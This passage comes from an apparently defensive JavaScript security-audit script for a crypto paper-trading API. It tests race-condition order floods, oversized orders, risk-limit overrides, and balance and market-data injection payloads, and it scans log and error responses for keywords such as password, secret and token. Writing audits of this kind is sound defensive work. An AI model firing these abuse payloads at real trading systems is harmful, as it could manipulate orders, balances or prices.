        if (text.includes('password') || text.includes('secret') || text.includes('key')) {
          vulnerabilities.push(`Sensitive information exposed at ${endpoint}`);
        }
      }
    }
    
    return {
      passed: vulnerabilities.length === 0,
      details: vulnerabilities.length > 0 ? vulnerabilities : 'Error handling secure',
      riskLevel: vulnerabilities.length > 0 ? 'medium' : 'low'
    };
  }

  async testLoggingSecurity() {
    // Test if logs contain sensitive information
    let vulnerabilities = [];
    
    try {
      // Check if log files are accessible
      const logEndpoints = [
        '/api/logs',
        '/api/admin/logs',
        '/logs/application.log',
        '/logs/error.log'
      ];
      
      for (const endpoint of logEndpoints) {
        const response = await this.makeRequest(endpoint, {
          headers: this.getAuthHeaders()
        });
        
        if (response && response.ok) {
          const text = await response.text();
          
          if (text.includes('password') || text.includes('secret') || text.includes('token')) {
            vulnerabilities.push(`Sensitive information in logs at ${endpoint}`);
          }
        }
      }
      
    } catch (error) {
      // Expected if logs are properly protected
    }
    
    return {
      passed: vulnerabilities.length === 0,
      details: vulnerabilities.length > 0 ? vulnerabilities : 'Logging security proper',
      riskLevel: vulnerabilities.length > 0 ? 'medium' : 'low'
    };
  }

  async testBusinessLogicSecurity() {
    this.log('info', '💼 Testing Business Logic Security');
    
    const businessTests = [
      { name: 'Trading Logic Manipulation', test: () => this.testTradingLogicManipulation() },
      { name: 'Risk Management Bypass', test: () => this.testRiskManagementBypass() },
      { name: 'Portfolio Manipulation', test: () => this.testPortfolioManipulation() },
      { name: 'Market Data Manipulation', test: () => this.testMarketDataManipulation() }
    ];
    
    for (const businessTest of businessTests) {
      try {
        this.log('info', `Testing: ${businessTest.name}`);
        const result = await businessTest.test();
        this.recordTestResult(businessTest.name, result.passed, result.details, result.riskLevel);
      } catch (error) {
        this.recordTestResult(businessTest.name, false, error.message, 'high');
      }
    }
  }

  async testTradingLogicManipulation() {
    const manipulationAttempts = [
      {
        name: 'Concurrent order placement',
        test: async () => {
          const promises = Array(10).fill(0).map(() =>
            this.makeRequest('/api/trading/execute', {
              method: 'POST',
              headers: this.getAuthHeaders(),
              body: JSON.stringify({
                symbol: 'BTCUSDT',
                side: 'buy',
                amount: 0.01
              })
            })
          );
          
          const responses = await Promise.all(promises);
          const successCount = responses.filter(r => r && r.ok).length;
          return successCount > 1; // Should only allow one if properly protected
        }
      },
      {
        name: 'Order size manipulation',
        test: async () => {
          const response = await this.makeRequest('/api/trading/execute', {
            method: 'POST',
            headers: this.getAuthHeaders(),
            body: JSON.stringify({
              symbol: 'BTCUSDT',
              side: 'buy',
              amount: Number.MAX_SAFE_INTEGER
            })
          });
          
          return response && response.ok;
        }
      }
    ];
    
    let vulnerabilities = [];
    
    for (const attempt of manipulationAttempts) {
      const result = await attempt.test();
      if (result) {
        vulnerabilities.push(`Trading logic manipulation successful: ${attempt.name}`);
      }
    }
    
    return {
      passed: vulnerabilities.length === 0,
      details: vulnerabilities.length > 0 ? vulnerabilities : 'Trading logic properly protected',
      riskLevel: vulnerabilities.length > 0 ? 'critical' : 'low'
    };
  }

  async testRiskManagementBypass() {
    const bypassAttempts = [
      {
        name: 'Risk limit override',
        payload: { symbol: 'BTCUSDT', side: 'buy', amount: 1000, override_risk: true }
      },
      {
        name: 'Multiple small orders',
        payload: { symbol: 'BTCUSDT', side: 'buy', amount: 0.001, count: 1000 }
      }
    ];
    
    let vulnerabilities = [];
    
    for (const attempt of bypassAttempts) {
      const response = await this.makeRequest('/api/trading/execute', {
        method: 'POST',
        headers: this.getAuthHeaders(),
        body: JSON.stringify(attempt.payload)
      });
      
      if (response && response.ok) {
        vulnerabilities.push(`Risk management bypass successful: ${attempt.name}`);
      }
    }
    
    return {
      passed: vulnerabilities.length === 0,
      details: vulnerabilities.length > 0 ? vulnerabilities : 'Risk management properly enforced',
      riskLevel: vulnerabilities.length > 0 ? 'high' : 'low'
    };
  }

  async testPortfolioManipulation() {
    const manipulationAttempts = [
      { balance: 999999999, currency: 'USDT' },
      { balance: -1000, currency: 'BTC' },
      { balance: 'unlimited', currency: 'ETH' }
    ];
    
    let vulnerabilities = [];
    
    for (const attempt of manipulationAttempts) {
      const response = await this.makeRequest('/api/portfolio/set-balance', {
        method: 'POST',
        headers: this.getAuthHeaders(),
        body: JSON.stringify(attempt)
      });
      
      if (response && response.ok) {
        vulnerabilities.push(`Portfolio manipulation successful: ${JSON.stringify(attempt)}`);
      }
    }
    
    return {
      passed: vulnerabilities.length === 0,
      details: vulnerabilities.length > 0 ? vulnerabilities : 'Portfolio properly protected',
      riskLevel: vulnerabilities.length > 0 ? 'high' : 'low'
    };
  }

  async testMarketDataManipulation() {
    const manipulationAttempts = [
      { symbol: 'BTCUSDT', price: -1000 },
      { symbol: 'BTCUSDT', price: 0 },
      { symbol: 'BTCUSDT', price: Infinity }
    ];
    
    let vulnerabilities = [];
    
    for (const attempt of manipulationAttempts) {
      const response = await this.makeRequest('/api/market-data/inject', {
        method: 'POST',
        headers: this.getAuthHeaders(),
        body: JSON.stringify(attempt)
      });
      
      if (response && response.ok) {
        vulnerabilities.push(`Market data manipulation successful: ${JSON.stringify(attempt)}`);
      }
    }
    
    return {
      passed: vulnerabilities.length === 0,
      details: vulnerabilities.length > 0 ? vulnerabilities : 'Market data properly protected',
      riskLevel: vulnerabilities.length > 0 ? 'high' : 'low'
    };
  } 
 async generateSecurityReport() {
    this.log('info', '📊 Generating Comprehensive Security Report');
    
    const endTime = Date.now();
    const duration = endTime - this.startTime;
    
    // Calculate summary statistics
    this.results.summary.totalTests = this.results.testResults.length;
    this.results.summary.passedTests = this.results.testResults.filter(t => t.passed).length;
    this.results.summary.failedTests = this.results.summary.totalTests - this.results.summary.passedTests;
    
    // Count vulnerabilities by risk level
    this.results.testResults.forEach(test => {
      if (!test.passed) {
        switch (test.riskLevel) {
          case 'critical':
            this.results.summary.criticalVulnerabilities++;
            break;
          case 'high':
            this.results.summary.highRiskVulnerabilities++;
            break;
          case 'medium':
            this.results.summary.mediumRiskVulnerabilities++;
            break;
          case 'low':
            this.results.summary.lowRiskVulnerabilities++;
            break;
        }
      }
    });
    
    // Generate recommendations
    this.generateRecommendations();
    
    // Generate risk assessment
    const riskAssessment = this.generateRiskAssessment();
    
    // Create detailed report
    const report = {
      metadata: {
        timestamp: new Date().toISOString(),
        duration: `${duration}ms`,
        baseUrl: this.baseUrl,
        testSuite: 'Comprehensive Security Audit v1.0'
      },
      summary: this.results.summary,
      testResults: this.results.testResults,
      vulnerabilities: this.results.vulnerabilities,
      recommendations: this.results.recommendations,
      riskAssessment: riskAssessment,
      complianceStatus: this.generateComplianceStatus()
    };
    
    // Save report to file
    const reportPath = path.join(__dirname, '..', 'comprehensive-security-audit-report.json');
    fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));
    
    // Generate summary console output
    this.printSecuritySummary(report);
    
    return report;
  }

  generateRecommendations() {
    const failedTests = this.results.testResults.filter(t => !t.passed);
    
    // Critical recommendations
    const criticalTests = failedTests.filter(t => t.riskLevel === 'critical');
    if (criticalTests.length > 0) {
      this.results.recommendations.push({
        priority: 'CRITICAL',
        category: 'Security',
        message: `${criticalTests.length} critical security vulnerabilities found`,
        action: 'Address immediately before deployment',
        blocking: true
      });
    }
    
    // Paper trading safety recommendations
    const paperTradingFailures = failedTests.filter(t => 
      t.testName.toLowerCase().includes('paper trading') || 
      t.testName.toLowerCase().includes('trading safety')
    );
    
    if (paperTradingFailures.length > 0) {
      this.results.recommendations.push({
        priority: 'CRITICAL',
        category: 'Paper Trading Safety',
        message: 'Paper trading safety mechanisms have vulnerabilities',
        action: 'Fix all paper trading safety issues before deployment',
        blocking: true
      });
    }
    
    // API security recommendations
    const apiFailures = failedTests.filter(t => 
      t.testName.toLowerCase().includes('api') || 
      t.testName.toLowerCase().includes('injection')
    );
    
    if (apiFailures.length > 0) {
      this.results.recommendations.push({
        priority: 'HIGH',
        category: 'API Security',
        message: `${apiFailures.length} API security issues found`,
        action: 'Implement proper input validation and sanitization',
        blocking: false
      });
    }
    
    // Authentication recommendations
    const authFailures = failedTests.filter(t => 
      t.testName.toLowerCase().includes('auth') || 
      t.testName.toLowerCase().includes('jwt')
    );
    
    if (authFailures.length > 0) {
      this.results.recommendations.push({
        priority: 'HIGH',
        category: 'Authentication',
        message: `${authFailures.length} authentication security issues found`,
        action: 'Strengthen authentication and authorization mechanisms',
        blocking: false
      });
    }
  }

  generateRiskAssessment() {
    const totalVulnerabilities = this.results.summary.criticalVulnerabilities + 
                                this.results.summary.highRiskVulnerabilities + 
                                this.results.summary.mediumRiskVulnerabilities + 
                                this.results.summary.lowRiskVulnerabilities;
    
    let overallRisk = 'LOW';
    let deploymentRecommendation = 'APPROVED';
    
    if (this.results.summary.criticalVulnerabilities > 0) {
      overallRisk = 'CRITICAL';
      deploymentRecommendation = 'BLOCKED';
    } else if (this.results.summary.highRiskVulnerabilities > 3) {
      overallRisk = 'HIGH';
      deploymentRecommendation = 'REVIEW_REQUIRED';
    } else if (this.results.summary.highRiskVulnerabilities > 0 || this.results.summary.mediumRiskVulnerabilities > 5) {
      overallRisk = 'MEDIUM';
      deploymentRecommendation = 'CAUTION_ADVISED';
    }
    
    return {
      overallRisk,
      deploymentRecommendation,
      totalVulnerabilities,
      riskDistribution: {
        critical: this.results.summary.criticalVulnerabilities,
        high: this.results.summary.highRiskVulnerabilities,
        medium: this.results.summary.mediumRiskVulnerabilities,
        low: this.results.summary.lowRiskVulnerabilities
      },
      paperTradingSafetyScore: this.calculatePaperTradingSafetyScore()
    };
  }

  calculatePaperTradingSafetyScore() {
    const paperTradingTests = this.results.testResults.filter(t => 
      t.testName.toLowerCase().includes('paper trading') || 
      t.testName.toLowerCase().includes('trading safety') ||
      t.testName.toLowerCase().includes('real trading') ||
      t.testName.toLowerCase().includes('virtual balance')
    );
    
    if (paperTradingTests.length === 0) return 0;
    
    const passedTests = paperTradingTests.filter(t => t.passed).length;
    return Math.round((passedTests / paperTradingTests.length) * 100);
  }

  generateComplianceStatus() {
    const requirements = {
      'Paper Trading Safety': this.calculatePaperTradingSafetyScore() >= 90,
      'API Security': this.results.testResults.filter(t => 
        t.testName.toLowerCase().includes('api') && t.passed
      ).length >= 5,
      'Authentication Security': this.results.testResults.filter(t => 
        t.testName.toLowerCase().includes('auth') && t.passed
      ).length >= 3,
      'Input Validation': this.results.testResults.filter(t => 
        (t.testName.toLowerCase().includes('injection') || 
         t.testName.toLowerCase().includes('validation')) && t.passed
      ).length >= 4,
      'Infrastructure Security': this.results.testResults.filter(t => 
        t.testName.toLowerCase().includes('infrastructure') && t.passed
      ).length >= 2
    };
    
    const totalRequirements = Object.keys(requirements).length;
    const metRequirements = Object.values(requirements).filter(Boolean).length;
    const compliancePercentage = Math.round((metRequirements / totalRequirements) * 100);
    
    return {
      compliancePercentage,
      requirements,
      status: compliancePercentage >= 80 ? 'COMPLIANT' : 'NON_COMPLIANT'
    };
  }

  printSecuritySummary(report) {
    console.log('\n' + '='.repeat(60));
    console.log('🔐 COMPREHENSIVE SECURITY AUDIT REPORT');
    console.log('='.repeat(60));
    
    console.log(`\n📊 Test Summary:`);
    console.log(`   Total Tests: ${report.summary.totalTests}`);
    console.log(`   Passed: ${report.summary.passedTests}`);
    console.log(`   Failed: ${report.summary.failedTests}`);
    console.log(`   Pass Rate: ${((report.summary.passedTests / report.summary.totalTests) * 100).toFixed(1)}%`);
    
    console.log(`\n🚨 Vulnerability Distribution:`);
    console.log(`   Critical: ${report.summary.criticalVulnerabilities}`);
    console.log(`   High: ${report.summary.highRiskVulnerabilities}`);
    console.log(`   Medium: ${report.summary.mediumRiskVulnerabilities}`);
    console.log(`   Low: ${report.summary.lowRiskVulnerabilities}`);
    
    console.log(`\n🛡️ Paper Trading Safety Score: ${report.riskAssessment.paperTradingSafetyScore}%`);
    
    console.log(`\n📋 Overall Risk Assessment: ${report.riskAssessment.overallRisk}`);
    console.log(`🚀 Deployment Recommendation: ${report.riskAssessment.deploymentRecommendation}`);
    
    console.log(`\n✅ Compliance Status: ${report.complianceStatus.status} (${report.complianceStatus.compliancePercentage}%)`);
    
    if (report.recommendations.length > 0) {
      console.log(`\n💡 Key Recommendations:`);
      report.recommendations.forEach((rec, index) => {
        console.log(`   ${index + 1}. [${rec.priority}] ${rec.message}`);
        console.log(`      Action: ${rec.action}`);
      });
    }
    
    console.log(`\n📄 Detailed report saved to: comprehensive-security-audit-report.json`);
    console.log('='.repeat(60));
  }

  // Utility methods
  async makeRequest(endpoint, options = {}) {
    try {
      const url = endpoint.startsWith('http') ? endpoint : `${this.baseUrl}${endpoint}`;
      const response = await fetch(url, {
        timeout: 10000,
        ...options
      });
      return response;
    } catch (error) {
      this.log('warning', `Request failed: ${endpoint}`, error.message);
      return null;
    }
  }

  getAuthHeaders() {
    const headers = { 'Content-Type': 'application/json' };
    if (this.authToken) {
      headers['Authorization'] = `Bearer ${this.authToken}`;
    }
    return headers;
  }

  recordTestResult(testName, passed, details, riskLevel = 'medium') {
    const result = {
      testName,
      passed,
      details,
      riskLevel,
      timestamp: new Date().toISOString()
    };
    
    this.results.testResults.push(result);
    
    if (!passed) {
      this.results.vulnerabilities.push({
        test: testName,
        severity: riskLevel,
        description: details,
        timestamp: result.timestamp
      });
    }
    
    const status = passed ? '✅ PASS' : '❌ FAIL';
    const risk = passed ? '' : ` [${riskLevel.toUpperCase()} RISK]`;
    this.log('info', `${status}${risk}: ${testName}`);
    
    if (!passed && typeof details === 'string') {
      this.log('warning', `  Details: ${details}`);
    } else if (!passed && Array.isArray(details)) {
      details.forEach(detail => this.log('warning', `  - ${detail}`));
    }
  }
}

// Main execution
async function main() {
  const audit = new ComprehensiveSecurityAudit();
  
  try {
    await audit.runSecurityAudit();
    
    // Exit with appropriate code based on results
    const criticalVulns = audit.results.summary.criticalVulnerabilities;
    const highVulns = audit.results.summary.highRiskVulnerabilities;
    
    if (criticalVulns > 0) {
      console.log('\n🚨 CRITICAL SECURITY VULNERABILITIES FOUND - DEPLOYMENT BLOCKED!');
      process.exit(1);
    } else if (highVulns > 3) {
      console.log('\n⚠️ HIGH RISK VULNERABILITIES FOUND - REVIEW REQUIRED!');
      process.exit(2);
    } else {
      console.log('\n✅ Security audit completed successfully!');
      process.exit(0);
    }
    
  } catch (error) {
    console.error('\n❌ Security audit failed:', error.message);
    process.exit(1);
  }
}

// Run if called directly
if (require.main === module) {
  main();
}

module.exports = ComprehensiveSecurityAudit;